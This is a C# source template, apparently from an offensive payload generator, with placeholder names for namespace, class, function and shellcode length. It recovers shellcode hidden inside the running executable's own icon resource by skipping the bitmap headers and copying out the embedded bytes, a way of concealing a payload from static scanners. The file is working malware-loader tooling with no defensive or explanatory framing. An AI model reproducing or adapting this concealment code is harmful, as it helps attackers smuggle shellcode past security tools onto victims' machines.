using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ####NAMESPACE####
{
    public static class ShellIcon
    {
        public const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        public const uint FILE_ATTRIBUTE_DIRECTORY = 0x10;

        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public IntPtr iIcon;
            public uint dwAttributes;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string szDisplayName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
            public string szTypeName;
        }

        [StructLayout(LayoutKind.Sequential)]
		public class ICONINFO
		{
			public int fIcon;
			public int xHotspot;
			public int yHotspot;
			public IntPtr hbmMask = IntPtr.Zero;
			public IntPtr hbmColor = IntPtr.Zero;
		}

        [Flags]
        public enum SHGFI : int
        {
            Icon = 0x000000100,
            DisplayName = 0x000000200,
            TypeName = 0x000000400,
            Attributes = 0x000000800,
            IconLocation = 0x000001000,
            ExeType = 0x000002000,
            SysIconIndex = 0x000004000,
            LinkOverlay = 0x000008000,
            Selected = 0x000010000,
            Attr_Specified = 0x000020000,
            LargeIcon = 0x000000000,
            SmallIcon = 0x000000001,
            OpenIcon = 0x000000002,
            ShellIconSize = 0x000000004,
            PIDL = 0x000000008,
            UseFileAttributes = 0x000000010,
            AddOverlays = 0x000000020,
            OverlayIndex = 0x000000040,
        }
    }

    public static class Win32
    {
        [DllImport("shell32.dll")]
        public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref ShellIcon.SHFILEINFO psfi, uint cbSizeFileInfo, uint uFlags);

        [DllImport("User32.dll")]
        public static extern int DestroyIcon(IntPtr hIcon);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, SetLastError = true)]
		public static extern bool GetIconInfo(HandleRef hIcon, out ShellIcon.ICONINFO info);

    }

    public static class ####CLASS####{

        public static byte[] IconToByte(Icon icon){
            IconConverter converter = new IconConverter();
            return converter.ConvertTo(icon, typeof(byte[])) as byte[];
        }

        public static byte[] ####FUNCTION####()
        {
            string filename = Assembly.GetExecutingAssembly().Location;
            int length = ####SHELLCODE_LENGTH####;

            Icon icon = Icon.ExtractAssociatedIcon(filename);

            // This will automatically create the Bitmap Info Header (14 bytes)
            // var bmp = icon.ToBitmap();

            using (MemoryStream ms = new MemoryStream())
            {
                // Take care of the Bitmap Info Header
                int offset = 14;
                // 40 bytes for the DIB Header
                offset += 40;
                icon.Save(ms);
                byte[] data = ms.ToArray();
                byte[] copy = new byte[length];
                Buffer.BlockCopy(data, offset, copy, 0, length);
                Console.WriteLine(BitConverter.ToString(data));
                Console.WriteLine(BitConverter.ToString(copy));
                return copy;
            }

        }

        public static byte[] GetIcon(string filename, int size){

            byte[] data = new byte[size];
            ShellIcon.SHGFI flags = ShellIcon.SHGFI.Icon | ShellIcon.SHGFI.LargeIcon | ShellIcon.SHGFI.UseFileAttributes;

            ShellIcon.SHFILEINFO shinfo = new ShellIcon.SHFILEINFO();

            IntPtr hImgSmall = Win32.SHGetFileInfo(
                filename,
                ShellIcon.FILE_ATTRIBUTE_NORMAL,
                ref shinfo,
                (uint)Marshal.SizeOf(shinfo),
                (uint)(flags)
                );

            Marshal.Copy(shinfo.hIcon, data, 0, size);

            Win32.DestroyIcon(shinfo.hIcon);
            return data;

        }

    }
}



